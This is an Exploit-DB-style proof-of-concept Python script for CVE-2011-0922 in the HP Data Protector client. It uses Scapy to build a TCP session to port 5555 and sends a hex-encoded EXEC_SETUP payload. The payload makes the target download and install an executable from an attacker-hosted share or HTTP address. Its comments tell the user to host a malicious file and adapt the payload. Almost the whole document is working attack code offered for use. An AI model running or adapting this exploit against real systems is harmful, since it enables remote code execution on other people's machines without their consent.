# Exploit Title: HP Data Protector Cliet EXEC_SETUP Remote Code Execution Vulnerability PoC (ZDI-11-056)
# Date: 2011-05-29
# Author: fdisk
# Version: 6.11
# Tested on: Windows 2003 Server SP2 en
# CVE: CVE-2011-0922 
# Notes: ZDI-11-056
# Reference: http://www.zerodayinitiative.com/advisories/ZDI-11-056/ 
# Reference: http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02781143
#
# The following PoC instructs an HP Data Protector Client to download and install an .exe file. It tries to get the file 
# from a share (\\pwn2003se.home.it) and if it fails it tries to access the same file via HTTP. To get the PoC working with 
# this payload share a malicious file via HTTP under http://pwn2003se.home.it/Omniback/i386/installservice.exe.exe and you are done. 
# Tweak payload to better suit your needs.
#
# Since you're crafting packets with Scapy don't forget to use iptables to block the outbound resets or your host will 
# reset your connection after receiving and unsolicited SYN/ACK that is not associated with any open session/socket. Have Fun.
# 
# Special thanks to all the Exploit-DB Dev Team.
 
from scapy.all import *
 
if len(sys.argv) != 2:
    print "Usage: ./ZDI-11-056.py <Target IP>"
    sys.exit(1)

target = sys.argv[1]

payload = ("\x00\x00\x01\xbe"
"\xff\xfe\x32\x00\x00\x00\x20\x00\x70\x00\x77\x00\x6e\x00\x32\x00"
"\x30\x00\x30\x00\x33\x00\x73\x00\x65\x00\x2e\x00\x68\x00\x6f\x00"
"\x6d\x00\x65\x00\x2e\x00\x69\x00\x74\x00\x00\x00\x20\x00\x30\x00"
"\x00\x00\x20\x00\x53\x00\x59\x00\x53\x00\x54\x00\x45\x00\x4d\x00"
"\x00\x00\x20\x00\x4e\x00\x54\x00\x20\x00\x41\x00\x55\x00\x54\x00"
"\x48\x00\x4f\x00\x52\x00\x49\x00\x54\x00\x59\x00\x00\x00\x20\x00"
"\x43\x00\x00\x00\x20\x00\x32\x00\x36\x00\x00\x00\x20\x00\x5c\x00"
"\x5c\x00\x70\x00\x77\x00\x6e\x00\x32\x00\x30\x00\x30\x00\x33\x00"
"\x53\x00\x45\x00\x2e\x00\x68\x00\x6f\x00\x6d\x00\x65\x00\x2e\x00"
"\x69\x00\x74\x00\x5c\x00\x4f\x00\x6d\x00\x6e\x00\x69\x00\x62\x00"
"\x61\x00\x63\x00\x6b\x00\x5c\x00\x69\x00\x33\x00\x38\x00\x36\x00"
"\x5c\x00\x69\x00\x6e\x00\x73\x00\x74\x00\x61\x00\x6c\x00\x6c\x00"
"\x73\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x2e\x00"
"\x65\x00\x78\x00\x65\x00\x20\x00\x2d\x00\x73\x00\x6f\x00\x75\x00"
"\x72\x00\x63\x00\x65\x00\x20\x00\x5c\x00\x5c\x00\x70\x00\x77\x00"
"\x6e\x00\x32\x00\x30\x00\x30\x00\x33\x00\x53\x00\x45\x00\x2e\x00"
"\x68\x00\x6f\x00\x6d\x00\x65\x00\x2e\x00\x69\x00\x74\x00\x5c\x00"
"\x4f\x00\x6d\x00\x6e\x00\x69\x00\x62\x00\x61\x00\x63\x00\x6b\x00"
"\x20\x00\x00\x00\x20\x00\x5c\x00\x5c\x00\x70\x00\x77\x00\x4e\x00"
"\x32\x00\x30\x00\x30\x00\x33\x00\x53\x00\x45\x00\x5c\x00\x4f\x00"
"\x6d\x00\x6e\x00\x69\x00\x62\x00\x61\x00\x63\x00\x6b\x00\x5c\x00"
"\x69\x00\x33\x00\x38\x00\x36\x00\x5c\x00\x69\x00\x6e\x00\x73\x00"
"\x74\x00\x61\x00\x6c\x00\x6c\x00\x73\x00\x65\x00\x72\x00\x76\x00"
"\x69\x00\x63\x00\x65\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x20\x00"
"\x2d\x00\x73\x00\x6f\x00\x75\x00\x72\x00\x63\x00\x65\x00\x20\x00"
"\x5c\x00\x5c\x00\x70\x00\x77\x00\x4e\x00\x32\x00\x30\x00\x30\x00"
"\x33\x00\x53\x00\x45\x00\x5c\x00\x4f\x00\x6d\x00\x6e\x00\x69\x00"
"\x62\x00\x61\x00\x63\x00\x6b\x00\x20\x00\x00\x00\x00\x00\x00\x00"
"\x02\x54"
"\xff\xfe\x32\x00\x36\x00\x00\x00\x20\x00\x5b\x00\x30\x00\x5d\x00"
"\x41\x00\x44\x00\x44\x00\x2f\x00\x55\x00\x50\x00\x47\x00\x52\x00"
"\x41\x00\x44\x00\x45\x00\x0a\x00\x5c\x00\x5c\x00\x70\x00\x77\x00"
"\x6e\x00\x32\x00\x30\x00\x30\x00\x33\x00\x53\x00\x45\x00\x2e\x00"
"\x68\x00\x6f\x00\x6d\x00\x65\x00\x2e\x00\x69\x00\x74\x00\x5c\x00"
"\x4f\x00\x6d\x00\x6e\x00\x69\x00\x62\x00\x61\x00\x63\x00\x6b\x00"
"\x5c\x00\x69\x00\x33\x00\x38\x00\x36\x00\x0a\x00\x49\x00\x4e\x00"
"\x53\x00\x54\x00\x41\x00\x4c\x00\x4c\x00\x41\x00\x54\x00\x49\x00"
"\x4f\x00\x4e\x00\x54\x00\x59\x00\x50\x00\x45\x00\x3d\x00\x22\x00"
"\x43\x00\x6c\x00\x69\x00\x65\x00\x6e\x00\x74\x00\x22\x00\x20\x00"
"\x43\x00\x45\x00\x4c\x00\x4c\x00\x4e\x00\x41\x00\x4d\x00\x45\x00"
"\x3d\x00\x22\x00\x70\x00\x77\x00\x6e\x00\x32\x00\x30\x00\x30\x00"
"\x33\x00\x73\x00\x65\x00\x2e\x00\x68\x00\x6f\x00\x6d\x00\x65\x00"
"\x2e\x00\x69\x00\x74\x00\x22\x00\x20\x00\x43\x00\x45\x00\x4c\x00"
"\x4c\x00\x43\x00\x4c\x00\x49\x00\x45\x00\x4e\x00\x54\x00\x4e\x00"
"\x41\x00\x4d\x00\x45\x00\x3d\x00\x22\x00\x73\x00\x65\x00\x63\x00"
"\x75\x00\x72\x00\x6e\x00\x65\x00\x74\x00\x2d\x00\x62\x00\x32\x00"
"\x75\x00\x64\x00\x66\x00\x76\x00\x2e\x00\x68\x00\x6f\x00\x6d\x00"
"\x65\x00\x2e\x00\x69\x00\x74\x00\x22\x00\x20\x00\x41\x00\x4c\x00"
"\x4c\x00\x55\x00\x53\x00\x45\x00\x52\x00\x53\x00\x3d\x00\x35\x00"
"\x20\x00\x49\x00\x4e\x00\x53\x00\x54\x00\x41\x00\x4c\x00\x4c\x00"
"\x44\x00\x49\x00\x52\x00\x3d\x00\x22\x00\x24\x00\x28\x00\x4f\x00"
"\x4d\x00\x4e\x00\x49\x00\x42\x00\x41\x00\x43\x00\x4b\x00\x29\x00"
"\x5c\x00\x22\x00\x20\x00\x50\x00\x52\x00\x4f\x00\x47\x00\x52\x00"
"\x41\x00\x4d\x00\x44\x00\x41\x00\x54\x00\x41\x00\x3d\x00\x22\x00"
"\x24\x00\x28\x00\x44\x00\x41\x00\x54\x00\x41\x00\x4f\x00\x4d\x00"
"\x4e\x00\x49\x00\x42\x00\x41\x00\x43\x00\x4b\x00\x29\x00\x5c\x00"
"\x22\x00\x20\x00\x49\x00\x4e\x00\x45\x00\x54\x00\x50\x00\x4f\x00"
"\x52\x00\x54\x00\x3d\x00\x35\x00\x35\x00\x35\x00\x35\x00\x20\x00"
"\x41\x00\x44\x00\x44\x00\x4c\x00\x4f\x00\x43\x00\x41\x00\x4c\x00"
"\x3d\x00\x63\x00\x6f\x00\x72\x00\x65\x00\x2c\x00\x6a\x00\x61\x00"
"\x76\x00\x61\x00\x67\x00\x75\x00\x69\x00\x20\x00\x4f\x00\x50\x00"
"\x54\x00\x5f\x00\x44\x00\x4e\x00\x53\x00\x43\x00\x48\x00\x45\x00"
"\x43\x00\x4b\x00\x3d\x00\x31\x00\x20\x00\x4f\x00\x50\x00\x54\x00"
"\x5f\x00\x53\x00\x4b\x00\x49\x00\x50\x00\x49\x00\x4d\x00\x50\x00"
"\x4f\x00\x52\x00\x54\x00\x3d\x00\x31\x00\x20\x00\x4f\x00\x50\x00"
"\x54\x00\x5f\x00\x4d\x00\x53\x00\x47\x00\x3d\x00\x31\x00\x0a\x00"
"\x00\x00\x00\x00")
 
ip=IP(dst=target)
SYN=TCP(sport=31337, dport=5555, flags="S")
packet=ip/SYN
SYNACK=sr1(packet)

my_ack = SYNACK.seq + 1
print SYNACK.seq
print my_ack
ACK=TCP(sport=31337, dport=5555, flags="A", seq=1, ack=my_ack)
send(ip/ACK)

PUSH=TCP(sport=31337, dport=5555, flags="PA", seq=1, ack=my_ack)
send(ip/PUSH/payload)
